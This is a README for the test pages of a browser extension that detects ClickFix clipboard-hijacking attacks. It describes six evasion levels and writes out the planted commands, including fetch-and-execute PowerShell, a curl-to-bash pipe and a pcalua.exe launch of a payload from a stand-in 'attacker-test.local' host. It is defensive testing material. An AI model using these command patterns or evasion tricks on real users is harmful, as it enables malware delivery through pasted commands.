# Test pages

These pages exercise ClickFix Guard from simple to sophisticated. The commands
they contain are **harmless**, but run them in an isolated environment anyway —
a separate Chrome profile, ideally a VM. Not on a production machine.

## Serving

Open them over `http://` rather than `file://`; some clipboard APIs and the
level 3 `curl` test need a local server.

```bash
cd test-pages
python3 -m http.server 8000
```

- http://localhost:8000/level1-basic.html
- http://localhost:8000/level2-fake-captcha-clipboard.html
- http://localhost:8000/level3-evasion-macos.html
- http://localhost:8000/level4-multistage.html
- http://localhost:8000/level5-keywordless-behavioral.html
- http://localhost:8000/level6-hook-bypass.html

## Levels

| Level | Technique | Expected trigger | Expected result |
|---|---|---|---|
| 1 – Basic | Plain text, no JS | Win+R and `powershell` present in the DOM at load | Text score only; banner around the threshold |
| 2 – Fake CAPTCHA | `navigator.clipboard.writeText` plus delayed `display:none` → `block` | Clipboard hook (high weight, keyword matched) plus text | High score, banner appears immediately |
| 3 – Evasion | Full-width Unicode, DOM injection after 3 s, command string split in JS | NFKC normalisation, MutationObserver, runtime clipboard hook | Banner appears after ~3 s, not on the first static scan |
| 4 – Multi-stage | Level 2 inside an iframe, plus an instruction hidden in CSS `::before` | `all_frames: true` scans the iframe too | Banner appears; the `::before` text is **not** caught (known limitation) |
| 5 – Keywordless / behavioural | Flow of an observed campaign: nested `atob()` decode, command never written to the DOM, silent `writeText` on checkbox click | Neither keyword nor opaque-blob match — only "click on a verification control → silent write within 800 ms" (`clipboardAfterVerifyClick`) | Banner appears **only** via the behavioural layer; read alongside the case study in the main README |
| 6 – Hook bypass | (A) `Clipboard.prototype.writeText.call(navigator.clipboard, …)`; (B) pastejacking — a `copy` handler swaps a harmless-looking code for the command via `event.clipboardData.setData`. No Win+R/PowerShell wording on the page | Prototype-level hooks and the `clipboardData` hooks (keyword match), clipboard layer only | Banner on each technique (reload between them). Both went undetected before 0.4.0 |

## What the commands actually do

**Levels 1 and 4 (Windows).**
`powershell -NoProfile -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8gd29ybGQ='))"`
and `echo aGVsbG8gd29ybGQ= | certutil -decode - -`. Both print `hello world`. No
network access, no file writes.

**Level 2 (Windows).** `iex (irm 'https://www.google.com')` — Google's homepage
isn't valid PowerShell, so `iex` throws a parse error and stops harmlessly. A
classic proof-of-concept pattern: a live request that does nothing.

**Level 3 (macOS).** `curl -s http://localhost:8000/hello.sh | bash`, pointed
deliberately at **your own local server**. Piping `curl` from a third-party
domain into a shell isn't advisable even in a security test, since the domain can
change hands or be intercepted. `hello.sh` only echoes a line.

**Level 5 (Windows).** `pcalua.exe -a \\attacker-test.local\share\payload.exe`.
`attacker-test.local` does not resolve, so nothing is fetched or executed even if
pasted. `pcalua.exe` is a lesser-known LOLBin used in real ClickFix kits to get
around SmartScreen, and it is deliberately **absent** from the lists in
`CLIPBOARD_SUSPICIOUS` / `TEXT_PATTERNS` in `indicators.js` — the point of this level is to show that the
behavioural layer stands on its own when the keyword layer is intentionally blind.

**Level 6 (Windows).** The same command as level 1 — prints `hello world`, no
network access, no file writes.

## Testing a policy change

Allowlist and threshold changes are made as Chrome extension policy (see
"Central management" in the main README). The cleanest way to try one is a test
org unit in the Admin console containing only a test machine; on that machine,
*Reload policies* on `chrome://policy` applies the change immediately, and the
extension's own entry on that page shows exactly which values arrived.

The allowlist only accepts hostnames with at least two labels, so `localhost`
can't be allowlisted. To watch an allowlist entry take effect on these pages,
serve them under a two-label name such as `http://127.0.0.1.nip.io:8000/`
(public wildcard DNS that resolves to 127.0.0.1) and allowlist
`127.0.0.1.nip.io`. That origin isn't a secure context, so the async Clipboard
API is unavailable there — use level 1 (text only) or level 6B (copy event) for
this check. The popup footer says whether the organization's settings are in
effect and lists any entry that was rejected as invalid.

## Known limitation

Text injected through CSS `::before`/`::after` (level 4) is not part of
`document.body.innerText` and is therefore not caught. The technique is rare in
the wild — attackers generally rely on clipboard hijacking rather than hiding
text — but a `getComputedStyle(el, '::before').content` scan could be added at a
performance cost.
